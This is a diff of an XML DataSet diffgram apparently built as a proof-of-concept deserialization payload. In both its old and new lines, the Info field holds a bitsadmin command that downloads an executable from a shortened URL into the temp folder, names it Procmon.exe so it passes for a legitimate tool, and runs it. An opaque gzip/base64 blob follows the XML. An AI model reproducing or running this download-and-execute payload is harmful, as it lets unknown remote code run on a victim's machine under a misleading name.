@@ -3,14 +3,13 @@
     <bar diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
       <poc xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
         <TestWrapper>
-          <Info>/c bitsadmin /transfer myjob /download /priority normal https://tinyurl.com/Pr0cm0n %TEMP%\Procmon.exe && %TEMP%\Procmon.exe</Info>
-          <Timestamp>2025-07-21T22:19:55Z</Timestamp>
+          <Info>&lt;Info&gt;/c bitsadmin /transfer myjob /download /priority normal https://tinyurl.com/Pr0cm0n %TEMP%\Procmon.exe &amp;&amp; %TEMP%\Procmon.exe&lt;/Info&gt;</Info>
+          <Timestamp>2025-10-11T04:15:55Z</Timestamp>
         </TestWrapper>
       </poc>
     </bar>
   </foo>
 </diffgr:diffgram>
-
 
 
 H4sIAN286WgC/5WTy46jMBBFP6gXY6DTDYteEGiMGXASEjB4F5uIRzBBSgIxXz/Oox8jTS9mYalKKlWdurf8a3z3xCoxKWwFFYVciLingnZceCfkVycGZ9NCaBOFHsg3oC6y4LzocLOF6SnPohMjbcOFNTGdgpDggW36Z0bGE8vwPs/iCtVzlV/OfOr3W6I6G8hCXSpZ00+5XrWMeFNItD43goHrligcrWE6eNlB7RiSL5Ywyy+oecZObZdLSAc23WPk2GYuPIngo7bpe+qCOoVezWBSI/jB3ktmFEsu4pY3oI4cVH7tXFUc4ENOZh3NIguJ9sz1VBYw3X/MVHNK5F5GpkfllY110cvOx/1yHRwKPx4XtTkURmGEHZ9CYUkqTRm59iXUKrzxHnqttZ51GKg5DV2j7332/9cHPbmrw53pzpXQDIPUCCruz9V+35jvz1yTmVCaCeavXm+xpF3hHodczuttFk85iU9b8lyGRiwV30RFqjTVZlth1cix9kq7M4NWRR174H7QMyPoC39fMsWoPDwiWIHCn083ftied5ny2JldvRwSH425DkZW2236nuLESXniB0OuawOrZ+0OJmWgPObuUeREGxfyx7obfwjaMxWmuqXV69KxAibosCzB72/73jTZEq3lRlyxzH6KGlviNbhEjnrpasTu4YI3Bw2nBzPU4p6RdCrgleFv7VT/n7V1x4FDq/mcrfLrLT5yM9Qfd9qMw7/+17J8e/sDcWMtUoADAAA=
